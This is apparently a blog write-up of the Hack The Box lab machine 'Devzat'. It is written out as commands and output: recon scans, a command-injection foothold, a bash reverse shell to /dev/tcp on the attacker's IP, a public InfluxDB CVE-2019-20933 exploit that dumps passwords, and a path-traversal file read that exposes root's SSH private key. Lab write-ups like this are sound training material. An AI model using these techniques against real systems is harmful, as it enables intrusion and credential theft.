---
layout: single
title: Devzat - Hack The Box
excerpt: "Devzat is a medium Linux machine that features a web server and the `Devzat` chat application. Upon enumerating the web server, a new vhost called `pets` can be discovered. The `pets` vhost has a `.git` directory with listing enabled, providing access to the source code of `pets`. Reviewing the source code, a command injection vulnerability is discovered allowing an attacker to gain a reverse shell as the user `patrick`. Logging to the `Devzat` chat application as `patrick` on the remote machine the chat history between `patrick` and `admin` reveals that `InfluxDB` is installed on the remote system. Enumerating `InfluxDB` it is discovered that the version installed is vulnerable to [CVE-2019-20933](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20933), an authentication bypass vulnerability. Exploiting the aforementioned vulnerability an attacker is able to dump the contents of `InfluxDB` revealing the password of the user `catherine`. Switching from `patrick` to `catherine` and logging in to the Devzat chat application as `catherine` the chat history between the two reveals that a `dev` application is running on the remote machine and it&amp;amp;#039;s source code is located on the `backups` of `catherine`. Reviewing the source code of the `dev` service, it is revealed that it the same Devzat chat application with an extra authenticated command to include files on the chat. The credentials to perform this action are hard-coded on the source code and the command is vulnerable to LFI. Meaning that `catherine` can login to the `dev` chat, dump the contents of the SSH key of `root` and ultimately gain a shell as `root` on the remote machine using the SSH key."
date: 2025-06-05
classes: wide
header:
  teaser: /img2/devzat.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - Web Injection (RCE)
  - Abusing InfluxDB (CVE-2019-20933)
  - Abusing Devzat Chat /file command (Privilege Escalation)
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.118
```

```php
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 09:40 CEST
Initiating SYN Stealth Scan at 09:40
Scanning 10.10.11.118 [65535 ports]
Discovered open port 80/tcp on 10.10.11.118
Discovered open port 22/tcp on 10.10.11.118
Discovered open port 8000/tcp on 10.10.11.118
Completed SYN Stealth Scan at 09:41, 29.28s elapsed (65535 total ports)
Nmap scan report for 10.10.11.118
Host is up, received user-set (0.25s latency).
Scanned at 2025-06-05 09:40:48 CEST for 29s
Not shown: 48283 closed tcp ports (reset), 17249 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.44 seconds
           Raw packets sent: 143179 (6.300MB) | Rcvd: 50996 (2.040MB)
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p22,80,8000 10.10.11.118
```

```php
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 09:42 CEST
Nmap scan report for 10.10.11.118
Host is up (0.061s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.74 seconds
```

- Add domain to local DNS

```bash
❯ echo "10.10.11.118 devzat.htb" >> /etc/hosts
```

- Find subdomains with wfuzz

```bash
❯ wfuzz -c -t 50 --hw=26 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devzat.htb" http://devzat.htb/
```

```php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets"     
```

- Add subdomain to local DNS

```bash
❯ echo "10.10.11.118 pets.devzat.htb" >> /etc/hosts
```

- Try to add a new pet

![](/img2/Pasted%20image%2020250605111300.png)

> The web is returning a failed status code, so it is executing commands.

## Exploitation

- RCE

![](/img2/Pasted%20image%2020250605113411.png)

![](/img2/Pasted%20image%2020250605113433.png)

> We can see what command is executing:

```bash
cat characteristics/Bluewhale
```

![](/img2/Pasted%20image%2020250605113505.png)

```bash
❯ tcpdump -i tun0 icmp
```

```php
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:34:49.963309 IP devzat.htb > 10.10.16.7: ICMP echo request, id 1, seq 1, length 64
11:34:49.963325 IP 10.10.16.7 > devzat.htb: ICMP echo reply, id 1, seq 1, length 64
```

- Send reverse shell

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.16.7/9000 0>&1
```

![](/img2/Pasted%20image%2020250605114741.png)

```bash
❯ python3 -m http.server
```

```php
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.118 - - [05/Jun/2025 11:45:10] "GET /bash.sh HTTP/1.1" 200 -
```

```bash
nc -nlvp 9000
```

## Post-exploitation

- Connect to ssh port 8000

![](/img2/Pasted%20image%2020250605095024.png)

```bash
❯ ssh -l patrick devzat.htb -p 8000
```

```php
Unable to negotiate with 10.10.11.118 port 8000: no matching host key type found. Their offer: ssh-rsa                          
```

 > The algorithm ssh-rsa is disabled since OpenSSH 8.8, so we need to force the algorithm

```bash
❯ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa user@10.10.11.118 -p 8000
```

```php
The authenticity of host '[10.10.11.118]:8000 ([10.10.11.118]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.11.118]:8000' (RSA) to the list of known hosts.
Welcome to the chat. There are no more users
devbot: user has joined the chat
```

- Leaked info

```bash
❯ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa PATRICK@10.10.11.118 -p 8000
```

```php
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
```

> Influxdb database found

- Find Influxdb version 

```bash
patrick@devzat:/tmp$ ss -nltp
```

```php
State                Recv-Q               Send-Q                             Local Address:Port                             Peer Address:Port               Process                                         
LISTEN               0                    4096                                   127.0.0.1:8443                                  0.0.0.0:*                                                                  
LISTEN               0                    4096                                   127.0.0.1:5000                                  0.0.0.0:*                   users:(("petshop",pid=827,fd=3))               
LISTEN               0                    4096                               127.0.0.53%lo:53                                    0.0.0.0:*                                                                  
LISTEN               0                    4096                                   127.0.0.1:8086                                  0.0.0.0:*                                                                  
LISTEN               0                    128                                      0.0.0.0:22                                    0.0.0.0:*                                                                  
LISTEN               0                    4096                                           *:8000                                        *:*                   users:(("devchat",pid=826,fd=7))               
LISTEN               0                    511                                            *:80                                          *:*                                                                  
LISTEN               0                    128                                         [::]:22                                       [::]:*                                                                  
```

```bash
patrick@devzat:/tmp$ ssh patrick@localhost -p 8443
```

```php
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb 1.7.5 for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
```

> SSH dev found in port 8443, so we can connect with patrick user and see Influxdb version

- InfluxDB (CVE-2019-20933)

```bash
❯ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
```

```php
Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 37 (delta 12), reused 14 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (37/37), 10.58 KiB | 5.29 MiB/s, done.
Resolving deltas: 100% (12/12), done.

❯ cd InfluxDB-Exploit-CVE-2019-20933

❯ python3 __main__.py
/home/pyuser/InfluxDB-Exploit-CVE-2019-20933/__main__.py:174: SyntaxWarning: invalid escape sequence '\|'
  print(colored("""

  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
 - using CVE-2019-20933

Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
[admin@127.0.0.1] Database: devzat

Starting InfluxDB shell - .back to go back
[admin@127.0.0.1/devzat] $ SHOW MEASUREMENTS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[admin@127.0.0.1/devzat] $ SELECT * FROM "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

- Pivoting

```bash
su catherine
```

```php
Password: woBeeYareedahc7Oogeephies7Aiseci
```

- Find leaked info

```bash
catherine@devzat:/tmp$ ssh catherine@localhost -p 8000
```

```php
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat
```

> In the folder backup maybe can take the password of new function.

```bash
catherine@devzat:/tmp$ unzip /var/backups/devzat-dev.zip -d .
```

```php
Archive:  /var/backups/devzat-dev.zip
   creating: ./dev/
  inflating: ./dev/go.mod            
 extracting: ./dev/.gitignore        
  inflating: ./dev/util.go           
  inflating: ./dev/testfile.txt      
  inflating: ./dev/eastereggs.go     
  inflating: ./dev/README.md         
  inflating: ./dev/games.go          
  inflating: ./dev/colors.go         
 extracting: ./dev/log.txt           
  inflating: ./dev/commands.go       
  inflating: ./dev/start.sh          
  inflating: ./dev/devchat.go        
  inflating: ./dev/LICENSE           
  inflating: ./dev/commandhandler.go  
  inflating: ./dev/art.txt           
  inflating: ./dev/go.sum            
 extracting: ./dev/allusers.json     
```

```bash
catherine@devzat:/tmp$ cat dev/* | grep password -C 2
```

```php
func fileCommand(u *user, args []string) {
	if len(args) < 1 {
		u.system("Please provide file to print and the password")
		return
	}

	if len(args) < 2 {
		u.system("You need to provide the correct password to use this function")
		return
	}
--
	pass := args[1]

	// Check my secure password
	if pass != "CeilingCatStillAThingIn2021?" {
		u.system("You did provide the wrong password")
		return
	}
--
		u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
		u.writeln("catherine", "Kinda busy right now :necktie:")
		u.writeln("patrick", "That's perfectly fine :thumbs_up: You'll need a password which you can gather from the source. I left it in our default backups location.")
		u.writeln("catherine", "k")
		u.writeln("patrick", "I also put the main so you could `diff main dev` if you want.")
```

> CeilingCatStillAThingIn2021? is the password that we can use in the new function

- Abusing /file function (Getting flag)

```bash
catherine@devzat:/tmp/dev$ ssh catherine@localhost -p 8443
```

```php
catherine: ls
devbot: *clear *message *users *all *exit *bell *room *kick *id *commands *nick *color *timezone *emojis *help *tictactoe *hangman *shrug *ascii-art *example-code *file
devbot: Not a shell.
catherine: /file /etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
catherine: /file ../root.txt CeilingCatStillAThingIn2021?
[SYSTEM] 3354956ee1f9730052802d3a1c1562c2
```

- Abusing /file function (Root private key)

```php
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
```

```bash
catherine@devzat:/tmp$ chmod 600 id_rsa 
```

```bash
catherine@devzat:/tmp$ ssh -i id_rsa root@localhost 
```

```php
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 05 Jun 2025 11:40:36 AM UTC

  System load:              0.0
  Usage of /:               56.3% of 7.81GB
  Memory usage:             37%
  Swap usage:               0%
  Processes:                245
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.118
  IPv6 address for eth0:    dead:beef::250:56ff:fe94:f0cc


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


root@devzat:~# 
```

![](/img2/Pasted%20image%2020250605134343.png)